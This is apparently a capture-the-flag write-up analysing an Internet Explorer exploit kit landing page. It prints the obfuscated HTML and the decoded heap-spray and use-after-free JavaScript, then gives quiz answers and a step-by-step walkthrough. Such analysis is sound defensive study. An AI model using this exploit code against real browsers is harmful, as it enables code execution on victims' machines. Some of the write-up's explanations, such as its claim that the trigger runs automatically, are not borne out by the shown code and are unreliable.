# Browser Exploit 

## Challenge Description 
<img width="1153" height="398" alt="image" src="https://github.com/user-attachments/assets/1d1b1339-bbf1-4d16-b1bf-2abdf4aea3bc" />


## Solution and Analysis 

First get the .html file from the password protected archive and open it in notepad++ as shown 

<img width="1018" height="533" alt="image" src="https://github.com/user-attachments/assets/637b1c48-842a-4b16-9f4e-8f03a789810b" />

The initial code is heavily obfuscated. The primary logic is stored in a single URI-encoded string and executed dynamically.
```html
<html>

<head id='headId'>
    <title>SvWLQAda</title>
    <script>
        var hDAVYVhp = function (TRdPNtO) {
            return TRdPNtO['toString'](36)
        };
        var mqQUHDzc = '%66%75%6e%63%74%69%6f%6e%20%65%59%6c%52%66%58%28%64%77%6f%72%64%29%7b%76%61%72%20%64%3d%4e%75%6d%62%65%72%28%64%77%6f%72%64%29%5b%27%74%6f%53%74%72%69%6e%67%27%5d%28%31%36%29%3b%77%68%69%6c%65%28%64%5b%27%6c%65%6e%67%74%68%27%5d%3c%38%29%7b%64%3d%27%30%27%2b%64%3b%7d%72%65%74%75%72%6e%20%75%6e%65%73%63%61%70%65%28%27%25%75%27%2b%64%5b%27%73%75%62%73%74%72%27%5d%28%34%2c%38%29%2b%27%25%75%27%2b%64%5b%27%73%75%62%73%74%72%27%5d%28%30%2c%34%29%29%3b%7d%76%61%72%20%67%5f%61%72%72%3d%5b%5d%3b%76%61%72%20%61%72%72%4c%65%6e%3d%30%78%32%35%30%3b%66%75%6e%63%74%69%6f%6e%20%66%75%6e%28%29%7b%76%61%72%20%61%3d%30%3b%66%6f%72%28%61%3d%30%3b%61%3c%61%72%72%4c%65%6e%3b%2b%2b%61%29%7b%67%5f%61%72%72%5b%61%5d%3d%64%6f%63%75%6d%65%6e%74%5b%27%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%27%5d%28%27%64%69%76%27%29%3b%7d%3b%76%61%72%20%62%3d%65%59%6c%52%66%58%28%30%78%64%65%61%64%63%30%64%65%29%3b%76%61%72%20%63%3d%30%78%31%61%31%62%32%30%30%30%3b%77%68%69%6c%65%28%62%5b%27%6c%65%6e%67%74%68%27%5d%3c%30%78%33%36%30%29%7b%69%66%28%62%5b%27%6c%65%6e%67%74%68%27%5d%3d%3d%28%30%78%39%34%2f%32%29%29%7b%62%2b%3d%65%59%6c%52%66%58%28%63%2b%30%78%31%30%2d%30%78%30%63%29%3b%7d%65%6c%73%65%20%69%66%28%62%5b%27%6c%65%6e%67%74%68%27%5d%3d%3d%28%30%78%39%38%2f%32%29%29%7b%62%2b%3d%65%59%6c%52%66%58%28%63%2b%30%78%31%34%2d%30%78%38%29%3b%7d%65%6c%73%65%20%69%66%28%62%5b%27%6c%65%6e%67%74%68%27%5d%3d%3d%28%30%78%61%63%2f%32%29%29%7b%62%2b%3d%65%59%6c%52%66%58%28%63%2d%30%78%31%30%29%3b%7d%65%6c%73%65%20%69%66%28%62%5b%27%6c%65%6e%67%74%68%27%5d%3d%3d%28%30%78%31%35%63%2f%32%29%29%7b%62%2b%3d%65%59%6c%52%66%58%28%30%78%34%32%34%32%34%32%34%32%29%3b%7d%65%6c%73%65%7b%62%2b%3d%65%59%6c%52%66%58%28%30%78%31%61%31%62%32%30%30%30%2d%30%78%31%30%29%3b%7d%7d%3b%76%61%72%20%64%3d%62%5b%27%73%75%62%73%74%72%69%6e%67%27%5d%28%30%2c%28%30%78%33%34%30%2d%32%29%2f%32%29%3b%74%72%79%7b%74%68%69%73%5b%27%6f%75%74%65%72%48%54%4d%4c%27%5d%3d%74%68%69%73%5b%27%6f%75%74%65%72%48%54%4d%4c%27%5d%3b%7d%63%61%74%63%68%28%65%29%7b%7d%43%6f%6c%6c%65%63%74%47%61%72%62%61%67%65%28%29%3b%66%6f%72%28%61%3d%30%3b%61%3c%61%72%72%4c%65%6e%3b%2b%2b%61%29%7b%67%5f%61%72%72%5b%61%5d%5b%27%74%69%74%6c%65%27%5d%3d%64%5b%27%73%75%62%73%74%72%69%6e%67%27%5d%28%30%2c%64%5b%27%6c%65%6e%67%74%68%27%5d%29%3b%7d%7d%66%75%6e%63%74%69%6f%6e%20%70%75%49%48%61%33%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%5b%27%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%27%5d%28%27%73%63%72%69%70%74%27%29%3b%76%61%72%20%62%3d%61%5b%30%5d%3b%62%5b%27%6f%6e%70%72%6f%70%65%72%74%79%63%68%61%6e%67%65%27%5d%3d%66%75%6e%3b%76%61%72%20%63%3d%64%6f%63%75%6d%65%6e%74%5b%27%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%27%5d%28%27%53%45%4c%45%43%54%27%29%3b%63%3d%62%5b%27%61%70%70%65%6e%64%43%68%69%6c%64%27%5d%28%63%29%3b%7d%64%6f%63%75%6d%65%6e%74%5b%27%77%72%69%74%65%27%5d%28%27%3c%65%6d%62%65%64%20%73%72%63%3d%5c%27%65%35%36%64%32%2e%73%77%66%5c%27%20%77%69%64%74%68%3d%5c%27%31%30%30%70%78%5c%27%20%68%65%69%67%68%74%3d%5c%27%31%30%30%70%78%5c%27%3e%3c%2f%65%6d%62%65%64%3e%27%29%3b';
        this[hDAVYVhp(693741)](this[hDAVYVhp(2401885046066)](mqQUHDzc));
    </script>
    <noscript>
        <meta http-equiv='refresh' content='0;url=../nojs.php' />
    </noscript>
</head>

</html>
```

After decoding, we get the following malicious script:

```js
function eYlRfX(dword) {
    var d = Number(dword)['toString'](16);
    while (d['length'] < 8) {
        d = '0' + d;
    }
    return unescape('%u' + d['substr'](4, 8) + '%u' + d['substr'](0, 4));
}
var g_arr = [];
var arrLen = 0x250;
function fun() {
    var a = 0;
    for (a = 0; a < arrLen; ++a) {
        g_arr[a] = document['createElement']('div');
    };
    var b = eYlRfX(0xdeadc0de);
    var c = 0x1a1b2000;
    while (b['length'] < 0x360) {
        if (b['length'] == (0x94 / 2)) {
            b += eYlRfX(c + 0x10 - 0x0c);
        } else if (b['length'] == (0x98 / 2)) {
            b += eYlRfX(c + 0x14 - 0x8);
        } else if (b['length'] == (0xac / 2)) {
            b += eYlRfX(c - 0x10);
        } else if (b['length'] == (0x15c / 2)) {
            b += eYlRfX(0x42424242);
        } else {
            b += eYlRfX(0x1a1b2000 - 0x10);
        }
    };
    var d = b['substring'](0, (0x340 - 2) / 2);
    try {
        this['outerHTML'] = this['outerHTML'];
    } catch (e) {}
    CollectGarbage();
    for (a = 0; a < arrLen; ++a) {
        g_arr[a]['title'] = d['substring'](0, d['length']);
    }
}
function puIHa3() {
    var a = document['getElementsByTagName']('script');
    var b = a[0];
    b['onpropertychange'] = fun;
    var c = document['createElement']('SELECT');
    c = b['appendChild'](c);
}
document['write']('<embed src=\'e56d2.swf\' width=\'100px\' height=\'100px\'></embed>');
```
### 1. What function do you identify as responsible for converting input to a base 36 string?

*   **Answer:** `hDAVYVhp`
*   **Explanation:** This function is defined at the very beginning of the obfuscated script. It takes a number as input and calls the native `.toString(36)` method on it. It's used to dynamically generate the strings "eval" and "unescape" to execute the main payload.

---

### 2. What is the name of the function that converts numbers to hexadecimal strings with specific formatting?

*   **Answer:** `mqQUHDzc`
*   **Explanation:** This is a trick question. While the deobfuscated function is named `eYlRfX`, its definition originates from within the URI-encoded string stored in the `mqQUHDzc` variable. The question refers to the source of the function in the original, obfuscated code.

---

### 3. What is the name of the array that stores developer (div) elements?

*   **Answer:** `g_arr`
*   **Explanation:** The script declares `var g_arr = [];` and then populates this array with `<div>` elements inside the `fun()` function to prepare the browser's memory for the exploit.

---

### 4. What is the length of the array storing developer elements in decimal?

*   **Answer:** `592`
*   **Explanation:** The script defines the length with `var arrLen = 0x250;`. The hexadecimal value `0x250` is equal to `592` in decimal (2 * 16² + 5 * 16¹ = 512 + 80 = 592).

---

### 5. If JavaScript is disabled in the browser, which endpoint is accessed instead?

*   **Answer:** `nojs.php`
*   **Explanation:** The `<noscript>` tag in the HTML contains a meta-refresh directive that redirects the browser to this URL if JavaScript execution is blocked.

---

### 6. What is the name of the function responsible for triggering the exploit?

*   **Answer:** `puIHa3`
*   **Explanation:** This function is the trigger initiator. It sets up the conditions for the exploit to run by attaching the main payload function (`fun`) to the `onpropertychange` event of the script tag and then immediately causes that event to fire by appending a child element.

---

### 7. What is the name of the flash file embedded within the code?

*   **Answer:** `e56d2.swf`
*   **Explanation:** The final line of the deobfuscated script, `document['write']('<embed src=\'e56d2.swf\' ...>');`, dynamically embeds this Flash file into the page to help manipulate memory and finalize the exploit.

---

### 8. What is the CVE Number assigned to this exploit?

*   **Answer:** `CVE-2014-0322`

*   **Explanation:** The combination of a Use-After-Free vulnerability, the IE-specific `CollectGarbage()` function, a Heap Spray, and its known association with the "Operation Snowman" campaign pinpoints the vulnerability to CVE-2014-0322, which affected Internet Explorer 10.

  ## Detailed Exploit Walkthrough

This JavaScript code is a classic example of a browser **exploit kit (EK)** landing page. Its sole purpose is to exploit a specific vulnerability in a victim's browser to achieve **Remote Code Execution (RCE)**, allowing the attacker to run malicious code on the target machine.

The attack specifically targets **Internet Explorer 10** by leveraging a **Use-After-Free (UAF)** vulnerability tracked as **CVE-2014-0322**. The primary technique used to ensure the exploit's success is a **Heap Spray**.

The entire process can be broken down into a sequence of carefully orchestrated steps:

### Step 1: Obfuscation and Dynamic Execution

The first thing the malware does is hide its true nature. The entire malicious script is not written in plain text. Instead, it is:
1.  **URI-Encoded:** Stored as a long string of hexadecimal codes (`%66%75%6e...`) inside the `mqQUHDzc` variable.
2.  **Dynamically Executed:** The script avoids using the obvious `eval()` function directly, which might be flagged by security software. It cleverly reconstructs the command `eval(unescape(mqQUHDzc))` using the custom `hDAVYVhp` function. This function converts numbers to base-36 strings, turning `693741` into `"eval"` and `2401885046066` into `"unescape"`. This is a common anti-analysis and evasion technique.

### Step 2: Preparing the Memory (Heap Grooming)

Once the main script is decoded and running, the `fun()` function begins preparing the browser's memory for the attack. This is known as **Heap Grooming**.
```javascript
var g_arr = [];
var arrLen = 0x250; // 592
for (a = 0; a < arrLen; ++a) {
    g_arr[a] = document['createElement']('div');
};
```

The code creates 592 <div> elements and stores them in a global array (g_arr). This action allocates numerous, same-sized blocks of memory on the heap. By doing this, the attacker makes the memory layout of the browser process more predictable, which is essential for the success of the next steps.

### Step 3: Creating the Vulnerability (Use-After-Free Setup)

This is the most critical part of setting up the exploit.

```javascript
try {
    this['outerHTML'] = this['outerHTML'];
} catch (e) {}
CollectGarbage();

  
```


Triggering the Bug: The line this['outerHTML'] = this['outerHTML'] is a known trick that, in vulnerable versions of Internet Explorer 10, would improperly handle a specific object in memory. It causes the browser to free the memory associated with the object but fails to clear the pointer that references it. This creates a "dangling pointer."

Forcing Cleanup: The call to CollectGarbage() is a massive red flag. This is a non-standard, Internet Explorer-specific function. The attacker calls it to force the browser's garbage collector to run, which cleans up the freed memory block, leaving a predictable "hole" in the heap where the dangling pointer is still pointing.
### Step 4: The Attack (Heap Spraying the Shellcode)

Now that the memory trap is set, the attacker springs it with a Heap Spray.
```javascript
// 'd' contains the crafted shellcode and NOP sled
var d = b['substring'](0, (0x340 - 2) / 2);

for (a = 0; a < arrLen; ++a) {
    g_arr[a]['title'] = d;
}
```

  Payload Preparation: The code first constructs its malicious payload (b and then d). This payload consists of:

  - Shellcode: The actual machine code the attacker wants to execute (e.g., code to download and run a virus). This is marked by the 0xdeadc0de value.

  - NOP Sled: A long sequence of "No-Operation" instructions. This acts as a buffer, so even if the exploit doesn't land perfectly on the start of the shellcode, it will "slide" down the NOPs until it hits the real payload.

- Spraying Memory: The code then iterates through the 592 <div> elements it created earlier and assigns the malicious payload string to their title property. This action allocates new memory blocks to store these strings. Because of the predictable state of the heap, these new blocks will fill the "holes" created by CollectGarbage(), including the specific hole the dangling pointer is pointing to.
The result is that a large portion of the browser's memory is now "sprayed" with the attacker's shellcode. The dangling pointer is now pointing directly at the attacker's malicious code.

### Step 5: The Trigger

The entire process is initiated by the puIHa3 function, which is a self-contained trigger mechanism.

```javascript

    
function puIHa3() {
    var b = document['getElementsByTagName']('script')[0];
    b['onpropertychange'] = fun; // Hook the event
    var c = document['createElement']('SELECT');
    c = b['appendChild'](c); // Fire the event
}

  
```

It cleverly attaches the main exploit function (fun) to the onpropertychange event of the script tag itself and then immediately triggers that event by modifying the script element. This ensures the exploit runs automatically as soon as the script is parsed.

### Step 6: Final Execution

The final piece is the embedded Flash file (e56d2.swf). While the primary vulnerability is in Internet Explorer, the Flash object is used to perform a final memory manipulation that causes the browser to use the dangling pointer. When the browser follows the pointer to read what it thinks is a legitimate object, it instead finds the attacker's shellcode and begins executing it, giving the attacker full control over the browser process and the user's system.
    












